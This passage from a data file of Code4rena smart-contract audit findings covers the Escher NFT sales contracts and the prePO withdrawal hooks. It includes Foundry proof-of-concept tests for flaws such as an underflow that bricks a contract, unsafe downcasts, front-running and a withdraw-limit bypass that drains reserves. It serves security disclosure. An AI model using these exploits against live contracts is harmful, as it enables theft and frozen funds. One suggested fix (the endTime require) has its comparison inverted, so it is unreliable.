"primary issue", "selected for report", "sponsor confirmed", "M-13"], "target": "2022-12-escher-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-escher/blob/main/src/Escher.sol#L11 https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/65420cb9c943c32eb7e8c9da60183a413d90067a/contracts/access/AccessControlUpgradeable.sol#L150 https://github.com/code-423n4/2022-12-escher/blob/main/src/Escher721Factory.sol#L32   # Vulnerability details  ## Impact (     creator = has a CREATOR_ROLE in Escher.sol     non-creator = doesn't have a CREATOR_ROLE in Escher.sol )  Currently creating an ERC721 edition via the ```Escher721Factory.sol``` contract requires a user to have the ``` CREATOR_ROLE ``` in the main ``` Escher.sol ``` contract. This requirement would mean that only users with the aforementioned role can be admins of editions. This requirement can be bypassed by having a 'malicious' creator create an edition for someone who doesn't have the  ``` CREATOR_ROLE ``` set by creating the edition and granting the ```DEFAULT_ADMIN_ROLE``` to the non-creator via AccessControl.sol's ```grantRole()``` function. This way the non-creator can revoke the original creator's roles in this edition and gain full ownership. Now this non-creator admin can create sales and operate as if he/she was a creator.   This defeats the point of having a role for creators and makes this function of the protocol not as described == faulty.   ## Proof of Concept A creator can benefit from his role by taking in payments for creating ERC721 editions for other people. This would make sense so that his risk can be covered.   1. A creator gets onboarded to Escher.  2. For some time he stays good but then people start offering payments for edition ownership 3. The more creators there are in Escher the less of a chance to get caught but then again the more inclusive Escher gets the more people will pay to get their own edition,     which makes this pretty dangerous 3. This creator creates an edition with the payer's inputs and grants the payer the DEFAULT_ADMIN_ROLE 4. Payer revokes all of the creator's roles and becomes the new admin   You can edit the Escher721.t.sol file to look like this and then run the test normally, everything should go through without errors:  ```  // SPDX-License-Identifier: MIT pragma solidity ^0.8.17;  import \"forge-std/Test.sol\"; import {EscherTest} from \"./utils/EscherTest.sol\";  contract Escher721Test is EscherTest {     function setUp() public override {         super.setUp();     }     function test_grantRoles() public {         address _this = address(this);         // Malicious creator grants someone else the rights for this edition         edition.grantRole(bytes32(0x0), address(9));         vm.prank(address(9));         // Now this user can grant/revoke roles         edition.grantRole(edition.MINTER_ROLE(), address(9));         assertEq(edition.hasRole(bytes32(0x0), address(9)), true);         // clean out the partner         edition.revokeRole(bytes32(0x0), _this);         assertEq(edition.hasRole(bytes32(0x0), _this), false);     } } ```  This kind of attack/abuse is currently hard to track. There is no centralized database of created editions and their admins at the time of creations (i.e. a mapping). This makes it hard to track down malicious creators who create editions for other people. Looping through the emitted events and comparing current admins to the emitted admins is a hassle especially if this protocol gains a lot of traction in the future which I assume is the end goal here.   ## Tools Used Manual review, visual studio code, forge  ## Recommended Mitigation Steps  In ```EscherERC721.sol``` implementation contract, it is recommended to override the ```grantRole()``` function of ```AccessControlUpgradeable.sol``` with something like: ``` function grantRole(bytes32 role, address account) internal override {     revert(\"Admins can't be chagned\"); } ```  This will disable the granting of roles after initialization. The initialization function already has the required granting of roles done and they cannot be changed after this fix.  Overall it would be recommended to store the created editions in a mapping for example to prevent problems like these. "}, {"title": "NFTs mintable after Auction deadline expires", "html_url": "https://github.com/code-423n4/2022-12-escher-findings/issues/474", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-12"], "target": "2022-12-escher-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/LPDA.sol#L58-L89   # Vulnerability details  ## Impact  The `buy` function on the `LPDA.sol` contract is not validating if the auction is still running, allowing a purchase to be made after the stipulated time. The `endtime` variable used to store the end date of the auction is not used at any point to validate whether the purchase is being made within the deadline.  ## Proof of Concept  ``` // SPDX-License-Identifier: MIT   pragma solidity ^0.8.17;   import \"forge-std/Test.sol\";  import {EscherTest} from \"./utils/EscherTest.sol\";  import {LPDAFactory, LPDA} from \"src/minters/LPDAFactory.sol\";   contract LPDABase is EscherTest {   LPDAFactory public lpdaSales;   LPDA.Sale public lpdaSale;     function setUp() public virtual override {    super.setUp();    lpdaSales = new LPDAFactory();   // set up a LPDA Sale    lpdaSale = LPDA.Sale({     currentId: uint48(0),     finalId: uint48(10),     edition: address(edition),     startPrice: uint80(uint256(1 ether)),     finalPrice: uint80(uint256(0.1 ether)),     dropPerSecond: uint80(uint256(0.1 ether) / 1 days),     startTime: uint96(block.timestamp),     saleReceiver: payable(address(69)),     endTime: uint96(block.timestamp + 1 days)    });  }  }   contract LPDATest is LPDABase {   LPDA public sale;     event End(LPDA.Sale _saleInfo);   function test_Buy() public {    sale = LPDA(lpdaSales.createLPDASale(lpdaSale));    // authorize the lpda sale to mint tokens   edition.grantRole(edition.MINTER_ROLE(), address(sale));   vm.warp(block.timestamp + 3 days);    sale.buy{value: 1 ether}(1);    assertEq(address(sale).balance, 1 ether);   }  } ```  The code above shows that even after two days after the `endTime` it was still possible to make the purchase.  ## Recommended Mitigation Steps  Our recommendation would be to introduce a require to validate the  if the purchase is being made within the `endTime`.   ``` require(block.timestamp > sale.endTime, \"TOO LATE\"); ```  The above could must be placed at the beginning of the `buy` function."}, {"title": "Creator can still \"cancel\" a sale after it has started by revoking permissions in `OpenEdition` contract", "html_url": "https://github.com/code-423n4/2022-12-escher-findings/issues/399", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-11"], "target": "2022-12-escher-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/OpenEdition.sol#L75   # Vulnerability details  The `OpenEdition` type of sale has a start time and an end time. The creator (or owner of the contract) can cancel a sale using the `cancel` function only if it hasn't started yet (i.e. start time is after current block timestamp).  However, the NFT creator can still revoke the minting permissions to the sale contract if he wishes to pull out of the sale. This will prevent anyone from calling the `buy` and prevent any further sale from the collection.  ## Impact  The owner of the sale contract can still virtually cancel a sale after it has started by simply revoking the minting permissions to the sale contract.  This will cause the `buy` function to fail because the call to `mint` will revert, effectively making it impossible to further purchase NFTs and causing the effect of canceling the sale.  ## PoC  In the following test, the creator of the sale decides to pull from it in the middle of the elapsed duraction. After that, he only needs to wait until the end time passes to call `finalize` and end the sale.  ```solidity // SPDX-License-Identifier: MIT pragma solidity ^0.8.17;  import \"forge-std/Test.sol\"; import {FixedPriceFactory} from \"src/minters/FixedPriceFactory.sol\"; import {FixedPrice} from \"src/minters/FixedPrice.sol\"; import {OpenEditionFactory} from \"src/minters/OpenEditionFactory.sol\"; import {OpenEdition} from \"src/minters/OpenEdition.sol\"; import {LPDAFactory} from \"src/minters/LPDAFactory.sol\"; import {LPDA} from \"src/minters/LPDA.sol\"; import {Escher721} from \"src/Escher721.sol\";  contract AuditTest is Test {     address deployer;     address creator;     address buyer;      FixedPriceFactory fixedPriceFactory;     OpenEditionFactory openEditionFactory;     LPDAFactory lpdaFactory;      function setUp() public {         deployer = makeAddr(\"deployer\");         creator = makeAddr(\"creator\");         buyer = makeAddr(\"buyer\");          vm.deal(buyer, 1e18);          vm.startPrank(deployer);          fixedPriceFactory = new FixedPriceFactory();         openEditionFactory = new OpenEditionFactory();         lpdaFactory = new LPDAFactory();          vm.stopPrank();     }          function test_OpenEdition_buy_CancelSaleByRevokingRole() public {         // Setup NFT and create sale         vm.startPrank(creator);          Escher721 nft = new Escher721();         nft.initialize(creator, address(0), \"Test NFT\", \"TNFT\");          uint24 startId = 0;         uint72 price = 1e6;         uint96 startTime = uint96(block.timestamp);         uint96 endTime = uint96(block.timestamp + 1 hours);          OpenEdition.Sale memory sale = OpenEdition.Sale(             price, // uint72 price;             startId, // uint24 currentId;             address(nft), // address edition;             startTime, // uint96 startTime;             payable(creator), // address payable saleReceiver;             endTime // uint96 endTime;         );         OpenEdition openSale = OpenEdition(openEditionFactory.createOpenEdition(sale));          nft.grantRole(nft.MINTER_ROLE(), address(openSale));          vm.stopPrank();          // simulate we are in the middle of the sale duration         vm.warp(startTime + 0.5 hours);          // Now creator decides to pull out of the sale. Since he can't cancel the sale because it already started and he can't end the sale now because it hasn't finished, he revokes the minter role. This will cause the buy transaction to fail.         vm.startPrank(creator);          nft.revokeRole(nft.MINTER_ROLE(), address(openSale));          vm.stopPrank();          vm.startPrank(buyer);          // Buyer can't call buy because sale contract can't mint tokens, the buy transaction reverts.         uint256 amount = 1;         vm.expectRevert();         openSale.buy{value: price * amount}(amount);          vm.stopPrank();          // Now creator just needs to wait until sale ends         vm.warp(endTime);          vm.prank(creator);         openSale.finalize();     } } ```  ## Recommendation  One possibilty is to acknowledge the fact the creator has still control over the minting process and can arbitrarily decide when to cancel the sale. If this route is taken, then the recommendation would be to make the `cancel` function unrestricted.  Preminting the NFTs is not a solution because of high gas costs and the fact that the amount of tokens to be sold is not known beforehand, it's determined by the actual amount sold during the sale.  A more elaborated solution that would require additional architecture changes is to prevent the revocation of the minting permissions if some conditions (defined by target sale contract) are met. "}, {"title": "`LPDA` price can underflow the price due to bad settings and potentially brick the contract", "html_url": "https://github.com/code-423n4/2022-12-escher-findings/issues/392", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-02"], "target": "2022-12-escher-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L117-L124   # Vulnerability details  The dutch auction in the `LPDA` contract is implemented by configuring a start price and price drop per second.  A bad set of settings can cause an issue where the elapsed duration of the sale multiplied by the drop per second gets bigger than the start price and underflows the current price calculation.  https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L117  ```solidity function getPrice() public view returns (uint256) {     Sale memory temp = sale;     (uint256 start, uint256 end) = (temp.startTime, temp.endTime);     if (block.timestamp < start) return type(uint256).max;     if (temp.currentId == temp.finalId) return temp.finalPrice;      uint256 timeElapsed = end > block.timestamp ? block.timestamp - start : end - start;     return temp.startPrice - (temp.dropPerSecond * timeElapsed); } ```  This means that if `temp.dropPerSecond * timeElapsed > temp.startPrice` then the unsigned integer result will become negative and underflow, leading to potentially bricking the contract and an eventual loss of funds.  ## Impact  Due to Solidity 0.8 default checked math, the subtraction of the start price and the drop will cause a negative value that will generate an underflow in the unsigned integer type and lead to a transaction revert.  Calls to `getPrice` will revert, and since this function is used in the `buy` to calculate the current NFT price it will also cause the buy process to fail. The price drop will continue to increase as time passes, making it impossible to recover from this situation and effectively bricking the contract.  This will eventually lead to a loss of funds because currently the only way to end a sale and transfer funds to the sale and fee receiver is to buy the complete set of NFTs in the sale (i.e. buy everything up to the `sale.finalId`) which will be impossible if the `buy` function is bricked.  ## PoC  In the following test, the start price is 1500 and the duration is 1 hour (3600 seconds) with a drop of 1 per second. At about ~40% of the elapsed time the price drop will start underflowing the price, reverting the calls to both `getPrice` and `buy`.  ```solidity // SPDX-License-Identifier: MIT pragma solidity ^0.8.17;  import \"forge-std/Test.sol\"; import {FixedPriceFactory} from \"src/minters/FixedPriceFactory.sol\"; import {FixedPrice} from \"src/minters/FixedPrice.sol\"; import {OpenEditionFactory} from \"src/minters/OpenEditionFactory.sol\"; import {OpenEdition} from \"src/minters/OpenEdition.sol\"; import {LPDAFactory} from \"src/minters/LPDAFactory.sol\"; import {LPDA} from \"src/minters/LPDA.sol\"; import {Escher721} from \"src/Escher721.sol\";  contract AuditTest is Test {     address deployer;     address creator;     address buyer;      FixedPriceFactory fixedPriceFactory;     OpenEditionFactory openEditionFactory;     LPDAFactory lpdaFactory;      function setUp() public {         deployer = makeAddr(\"deployer\");         creator = makeAddr(\"creator\");         buyer = makeAddr(\"buyer\");          vm.deal(buyer, 1e18);          vm.startPrank(deployer);          fixedPriceFactory = new FixedPriceFactory();         openEditionFactory = new OpenEditionFactory();         lpdaFactory = new LPDAFactory();          vm.stopPrank();     }          function test_LPDA_getPrice_NegativePrice() public {         // Setup NFT and create sale         vm.startPrank(creator);          Escher721 nft = new Escher721();         nft.initialize(creator, address(0), \"Test NFT\", \"TNFT\");          // Duration is 1 hour (3600 seconds), with a start price of 1500 and a drop of 1, getPrice will revert and brick the contract at about 40% of the elapsed duration         uint48 startId = 0;         uint48 finalId = 1;         uint80 startPrice = 1500;         uint80 dropPerSecond = 1;         uint96 startTime = uint96(block.timestamp);         uint96 endTime = uint96(block.timestamp + 1 hours);          LPDA.Sale memory sale = LPDA.Sale(             startId, // uint48 currentId;             finalId, // uint48 finalId;             address(nft), // address edition;             startPrice, // uint80 startPrice;             0, // uint80 finalPrice;             dropPerSecond, // uint80 dropPerSecond;             endTime, // uint96 endTime;             payable(creator), // address payable saleReceiver;             startTime // uint96 startTime;         );         LPDA lpdaSale = LPDA(lpdaFactory.createLPDASale(sale));          nft.grantRole(nft.MINTER_ROLE(), address(lpdaSale));          vm.stopPrank();          // simulate we are in the middle of the sale duration         vm.warp(startTime + 0.5 hours);          vm.startPrank(buyer);          // getPrice will revert due to the overflow caused by the price becoming negative         vm.expectRevert();         lpdaSale.getPrice();          // This will also cause the contract to be bricked, since buy needs getPrice to check that the buyer is sending the correct amount         uint256 amount = 1;         uint256 price = 1234;         vm.expectRevert();         lpdaSale.buy{value: price * amount}(amount);          vm.stopPrank();     } } ```  ## Recommendation  Add a validation in the `LPDAFactory.createLPDASale` function to ensure that the given duration and drop per second settings can't underflow the price.  ```solidity require((sale.endTime - sale.startTime) * sale.dropPerSecond <= sale.startPrice, \"MAX DROP IS GREATER THAN START PRICE\"); ``` "}, {"title": "Unsafe downcasting operation truncate user's input", "html_url": "https://github.com/code-423n4/2022-12-escher-findings/issues/369", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "selected for report", "sponsor confirmed", "M-08"], "target": "2022-12-escher-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/LPDA.sol#L71 https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/LPDA.sol#L82 https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/LPDA.sol#L101 https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/FixedPrice.sol#L62   # Vulnerability details  ## Impact  Unsafe downcasting operation transcate user's input.  ## Proof of Concept  There are a few unsafe downcasting operation that transcate user's input. The impact can be severe or minial.  In FixedPrice.sol,  ```solidity /// @notice buy from a fixed price sale after the sale starts /// @param _amount the amount of editions to buy function buy(uint256 _amount) external payable {  Sale memory sale_ = sale;  IEscher721 nft = IEscher721(sale_.edition);  require(block.timestamp >= sale_.startTime, \"TOO SOON\");  require(_amount * sale_.price == msg.value, \"WRONG PRICE\");  uint48 newId = uint48(_amount) + sale_.currentId;  require(newId <= sale_.finalId, \"TOO MANY\");   for (uint48 x = sale_.currentId + 1; x <= newId; x++) {   nft.mint(msg.sender, x);  }   sale.currentId = newId;   emit Buy(msg.sender, _amount, msg.value, sale);   if (newId == sale_.finalId) _end(sale); } ```   the amount is unsafely downcasted from uint256 to uint48, note the code:    ```solidity require(_amount * sale_.price == msg.value, \"WRONG PRICE\"); uint48 newId = uint48(_amount) + sale_.currentId; ```  the upper limit for uint48 is 281474976710655,  if user wants to buy more than 281474976710655 amount of nft and pay the 281474976710655 * sale price amount, the user can only receive 281474976710655 amount of nft because of the downcasting.  In LPDA.sol, we are unsafely downcasting the price in the buy function  ```solidity receipts[msg.sender].amount += amount; receipts[msg.sender].balance += uint80(msg.value);  for (uint256 x = temp.currentId + 1; x <= newId; x++) {  nft.mint(msg.sender, x); }  sale.currentId = newId;  emit Buy(msg.sender, amount, msg.value, temp);  if (newId == temp.finalId) {  sale.finalPrice = uint80(price);  uint256 totalSale = price * amountSold;  uint256 fee = totalSale / 20;  ISaleFactory(factory).feeReceiver().transfer(fee);  temp.saleReceiver.transfer(totalSale - fee);  _end(); } ```  note the line:  uint80(msg.value) and uint80(price)  In LPDA.sol, same issue exists in the refund function:  ```solidity /// @notice allow a buyer to get a refund on the current price difference function refund() public {  Receipt memory r = receipts[msg.sender];  uint80 price = uint80(getPrice()) * r.amount;  uint80 owed = r.balance - price;  require(owed > 0, \"NOTHING TO REFUND\");  receipts[msg.sender].balance = price;  payable(msg.sender).transfer(owed); } ```  note the downcasting: uint80(getPrice())  this means if the price goes above uint80, it will be wrongly trancated to uint80 for price.  The Downcasting in LPDA.sol is damaging because it tracunated user's fund.  Below is the POC:  add test in LPDA.t.sol  https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/test/LPDA.t.sol#L167  ```solidity     function test_LPDA_downcasting_POC() public {          // make the lpda sales contract         sale = LPDA(lpdaSales.createLPDASale(lpdaSale));         // authorize the lpda sale to mint tokens         edition.grantRole(edition.MINTER_ROLE(), address(sale));         //lets buy an NFT          uint256 val = uint256(type(uint80).max) + 10 ether;         console.log('msg.value');         console.log(val);         sale.buy{value: val}(1);          } ```  and import \"forge-std/console.sol\" in LPDA.sol  https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/LPDA.sol#L3  ```solidity import \"forge-std/console.sol\"; ```  and add console.log in LPDA.sol buy function.  https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/LPDA.sol#L69  ```solidity receipts[msg.sender].amount += amount; receipts[msg.sender].balance += uint80(msg.value);  console.log(\"truncated value\"); console.log(receipts[msg.sender].balance); ```  We run our test:  ```solidity forge test -vv --match test_LPDA_downcasting_POC ```  the output is:  ```solidity Running 1 test for test/LPDA.t.sol:LPDATest [PASS] test_LPDA_downcasting_POC() (gas: 385619) Logs:   msg.value   1208935819614629174706175   truncated value   9999999999999999999  Test result: ok. 1 passed; 0 failed; finished in 3.61ms ```  as we can see, user uses 1208935819614629174706175 to buy in LPDA.sol but the balance is truncated to 9999999999999999999, later user is not able to get the refund they are entitled to because the msg.value is unsafely downcasted.  Also note the downcasting for getPrice in LPDA.sol is also a issue:  the getPrice in LPDA.sol returns a uint256  ```solidity /// @notice the price of the sale function getPrice() public view returns (uint256) {  Sale memory temp = sale;  (uint256 start, uint256 end) = (temp.startTime, temp.endTime);  if (block.timestamp < start) return type(uint256).max;  if (temp.currentId == temp.finalId) return temp.finalPrice;   uint256 timeElapsed = end > block.timestamp ? block.timestamp - start : end - start;  return temp.startPrice - (temp.dropPerSecond * timeElapsed); } ```  but this is downcasted into uint80 in function buy and refund.  ```solidity uint80 price = uint80(getPrice()) * r.amount; ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  We recommend the project handle downcasting and use safe casting library to make sure the downcast does not unexpected truncate value.  https://docs.openzeppelin.com/contracts/3.x/api/utils#SafeCast "}, {"title": "`buy()` in `LPDA.sol` Can be Manipulated by Buyers", "html_url": "https://github.com/code-423n4/2022-12-escher-findings/issues/280", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-06"], "target": "2022-12-escher-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L68   # Vulnerability details  ## Impact A buyer could plan on buying early at higher prices to make sure he would secure a portion (say 50%) of NFTs he desired. When the number of NFTs still available got smaller and that `sale.endTime` were yet to hit, he would then watch the mempool and repeatedly attempt to thwart the final group of buyers from successfully completing their respective transactions amidst the efforts to prolong the Dutch auction till `sale.endTime` was reached.   ## Proof of Concept Assuming this particular edition pertained to a 100 NFT collection that would at most last for 60 minutes, and Bob planned on minting 10 of them. At the beginning of the dutch auction, he would first mint 5 NFTs at higher prices no doubt. At 50th minute, `sale.currentId == 95`. Alice, upon seeing this, made up her mind and proceeded to buying the remaining NFTs. Bob, seeing this transaction queuing in the mempool, invoked `buy()` to mint 1 NFT by sending in higher amount of gas to front run Alice. Needless to say, Alice's transaction was going to revert on line 68 because `newId == 101`:  [File: LPDA.sol#L68](https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L68)  ``` 68:        require(newId <= temp.finalId, \"TOO MANY\"); ``` Noticing the number of NFTs still available had become 4, Alice attempted to mint the remaining 4 NFTs this time. Bob, upon seeing the similar queue in the mempool again, front ran Alice with another mint of 1 NFT.   These steps were repeatedly carried out until Bob managed to get all NFTs he wanted where the last one was minted right after `sale.endTime` hit. At this point, every successful buyers was happy to get the biggest refund possible ensuring that each NFT was only paid for the lowest price. This intended goal, on the contrary, was achieved at the expense of the seller getting the lowest amount of revenue and that the front run buyers minting nothing.   ## Tools Used Manual inspection  ## Recommended Mitigation Steps Considering refactoring the affected code line as follows:  ``` - require(newId <= temp.finalId, \"TOO MANY\"); + if(newId > temp.finalId) { +      uint256 diff = newId - temp.finalId;  +      newId = temp.finalId; +      amountSold -= diff; +      amount -= diff; + } ```"}, {"title": "`OpenEdition.buy()` might revert due to uint overflow when it should work.", "html_url": "https://github.com/code-423n4/2022-12-escher-findings/issues/175", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-03"], "target": "2022-12-escher-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/OpenEdition.sol#L63   # Vulnerability details  ## Impact `OpenEdition.buy()` might revert due to uint overflow when it should work.  ## Proof of Concept `OpenEdition.buy()` validates the total funds like below.  ```solidity     function buy(uint256 _amount) external payable {         uint24 amount = uint24(_amount);         Sale memory temp = sale;         IEscher721 nft = IEscher721(temp.edition);         require(block.timestamp >= temp.startTime, \"TOO SOON\");         require(block.timestamp < temp.endTime, \"TOO LATE\");         require(amount * sale.price == msg.value, \"WRONG PRICE\"); //@audit overflow ```  Here, `amount` was declared as `uint24` and `sale.price` is `uint72`.  And it will revert when `amount * sale.price >= type(uint72).max` and such cases would be likely to happen e.g. `amount = 64(so 2^6), sale.price = 73 * 10^18(so 2^66)`.  As a result, `buy()` might revert when it should work properly.  ## Tools Used Manual Review  ## Recommended Mitigation Steps We should modify like below.  ```solidity     require(uint256(amount) * sale.price == msg.value, \"WRONG PRICE\"); ```"}, {"title": "Use of `payable.transfer()` Might Render ETH Impossible to Withdraw", "html_url": "https://github.com/code-423n4/2022-12-escher-findings/issues/99", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "M-02"], "target": "2022-12-escher-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L105 https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L85-L86 https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/FixedPrice.sol#L109 https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/OpenEdition.sol#L92   # Vulnerability details  ## Impact The protocol uses Solidity\u2019s `transfer()` when transferring ETH to the recipients. This has some notable shortcomings when the recipient is a smart contract, which can render ETH impossible to transfer. Specifically, the transfer will inevitably fail when the smart contract:  - does not implement a payable fallback function, or - implements a payable fallback function which would incur more than 2300 gas units, or - implements a payable fallback function incurring less than 2300 gas units but is called through a proxy that raises the call\u2019s gas usage above 2300.  ## Proof of Concept [File: LPDA.sol](https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol)  ``` 85:            ISaleFactory(factory).feeReceiver().transfer(fee); 86:            temp.saleReceiver.transfer(totalSale - fee);  105:        payable(msg.sender).transfer(owed); ``` [File: FixedPrice.sol#L109](https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/FixedPrice.sol#L109)  ``` 109:        ISaleFactory(factory).feeReceiver().transfer(address(this).balance / 20); ``` [File: OpenEdition.sol#L92](https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/OpenEdition.sol#L92)  ``` 92:        ISaleFactory(factory).feeReceiver().transfer(address(this).balance / 20); ``` Issues pertaining to the use of `transfer()` in the code blocks above may be referenced further via:  - [CONSENSYS Diligence's article](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/) - [OpenZeppelin news & events](https://blog.openzeppelin.com/reentrancy-after-istanbul/)   ## Tools Used Manual inspection  ## Recommended Mitigation Steps Using `call` with its returned boolean checked in combination with re-entrancy guard is highly recommended after December 2019.  For instance, [line 105](https://github.com/code-423n4/2022-12-escher/blob/main/src/minters/LPDA.sol#L105) in `LPDA.sol` may be refactored as follows:  ``` - payable(msg.sender).transfer(owed); + (bool success, ) = payable(msg.sender).call{ value: owed }(''); + require(success, \" Transfer of ETH Failed\"); ``` Alternatively, `Address.sendValue()` available in [OpenZeppelin Contract\u2019s Address library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L44-L65) can be used to transfer the Ether without being limited to 2300 gas units.   And again, in either of the above measures adopted, the risks of re-entrancy stemming from the use of this function can be mitigated by tightly following the \u201cCheck-effects-interactions\u201d pattern and/or using [OpenZeppelin Contract\u2019s ReentrancyGuard contract](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol#L43-L54)."}, {"title": "A whale user is able to cause freeze of funds of other users by bypassing withdraw limit", "html_url": "https://github.com/code-423n4/2022-12-prepo-findings/issues/310", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-02"], "target": "2022-12-prepo-findings", "body": "# Lines of code  https://github.com/prepo-io/prepo-monorepo/blob/3541bc704ab185a969f300e96e2f744a572a3640/apps/smart-contracts/core/contracts/WithdrawHook.sol#L61 https://github.com/prepo-io/prepo-monorepo/blob/3541bc704ab185a969f300e96e2f744a572a3640/apps/smart-contracts/core/contracts/WithdrawHook.sol#L68   # Vulnerability details  ## Description  In Collateral.sol, users may withdraw underlying tokens using withdraw. Importantly, the withdrawal must be approved by withdrawHook if set: ``` function withdraw(uint256 _amount) external override nonReentrant {   uint256 _baseTokenAmount = (_amount * baseTokenDenominator) / 1e18;   uint256 _fee = (_baseTokenAmount * withdrawFee) / FEE_DENOMINATOR;   if (withdrawFee > 0) { require(_fee > 0, \"fee = 0\"); }   else { require(_baseTokenAmount > 0, \"amount = 0\"); }   _burn(msg.sender, _amount);   uint256 _baseTokenAmountAfterFee = _baseTokenAmount - _fee;   if (address(withdrawHook) != address(0)) {     baseToken.approve(address(withdrawHook), _fee);     withdrawHook.hook(msg.sender, _baseTokenAmount, _baseTokenAmountAfterFee);     baseToken.approve(address(withdrawHook), 0);   }   baseToken.transfer(msg.sender, _baseTokenAmountAfterFee);   emit Withdraw(msg.sender, _baseTokenAmountAfterFee, _fee); } ```  The hook requires that two checks are passed: ``` if (lastGlobalPeriodReset + globalPeriodLength < block.timestamp) {   lastGlobalPeriodReset = block.timestamp;   globalAmountWithdrawnThisPeriod = _amountBeforeFee; } else {   require(globalAmountWithdrawnThisPeriod + _amountBeforeFee <= globalWithdrawLimitPerPeriod, \"global withdraw limit exceeded\");   globalAmountWithdrawnThisPeriod += _amountBeforeFee; } if (lastUserPeriodReset + userPeriodLength < block.timestamp) {   lastUserPeriodReset = block.timestamp;   userToAmountWithdrawnThisPeriod[_sender] = _amountBeforeFee; } else {   require(userToAmountWithdrawnThisPeriod[_sender] + _amountBeforeFee <= userWithdrawLimitPerPeriod, \"user withdraw limit exceeded\");   userToAmountWithdrawnThisPeriod[_sender] += _amountBeforeFee; } ```  If it has been less than \"globalPeriodLength\" seconds since the global reset, we step into the if block, reset time becomes now and starting amount is the current requested amount. Otherwise, the new amount must not overpass the globalWithdrawLimitPerPeriod. Very similar check is done for \"user\" variables.  The big issue here is that the limit can be easily bypassed by the first person calling withdraw in each group (\"global\" and \"user\"). It will step directly into the if block where no check is done, and fill the variable with any input amount.  As I understand, the withdraw limit is meant to make sure everyone is guaranteed to be able to withdraw the specified amount, so there is no chance of freeze of funds. However, due to the bypassing of this check, a whale user is able to empty the current reserves put in place and cause a freeze of funds for other users, until the Collateral contract is replenished.  ## Impact  A whale user is able to cause freeze of funds of other users by bypassing withdraw limit  ## Proof of Concept   1. Collateral.sol has 10000 USDC reserve 2. Withdraw limit is 150 USDC per user per period 3. There are 5 users - Alpha with collateral worth 12,000 USDC, and 4 users each with 1,000 USDC 4. Alpha waits for a time when request would create a new lastGlobalPeriodReset **and** new lastUserPeriodReset. He requests a withdraw of 10,000 USDC 5. The hook is passed and he withdraws the entire collateral reserves 6. At this point, victim Vic is not able to withdraw their 150 USDC. It is a freeze of funds.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Add limit checks in the if blocks as well, to make sure the first request does not overflow the limit.  ## Judge note  I've confirmed with PrePO team during the contest that withdraw limit bypass is a very serious issue"}, {"title": "Manager can get around min reserves check, draining all funds from Collateral.sol", "html_url": "https://github.com/code-423n4/2022-12-prepo-findings/issues/254", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-06"], "target": "2022-12-prepo-findings", "body": "# Lines of code  https://github.com/prepo-io/prepo-monorepo/blob/3541bc704ab185a969f300e96e2f744a572a3640/apps/smart-contracts/core/contracts/WithdrawHook.sol#L53-L79   # Vulnerability details  ## Impact When a manager withdraws funds from Collateral.sol, there is a check in the `managerWithdrawHook` to confirm that they aren't pushing the contract below the minimum reserve balance.  ```solidity require(collateral.getReserve() - _amountAfterFee >= getMinReserve(), \"reserve would fall below minimum\"); ```  However, a similar check doesn't happen in the `withdraw()` function.   The manager can use this flaw to get around the reserve balance by making a large deposit, taking a manager withdrawal, and then withdrawing their deposit.  ## Proof of Concept  Imagine a situation where the token has a balance of 100, deposits of 1000, and a reserve percentage of 10%. In this situation, the manager should not be able to make any withdrawal.  But, with the following series of events, they can: - Manager calls `deposit()` with 100 additional tokens - Manager calls `managerWithdraw()` to pull 100 tokens from the contract - Manager calls `withdraw()` to remove the 100 tokens they added  The result is that they are able to drain the balance of the 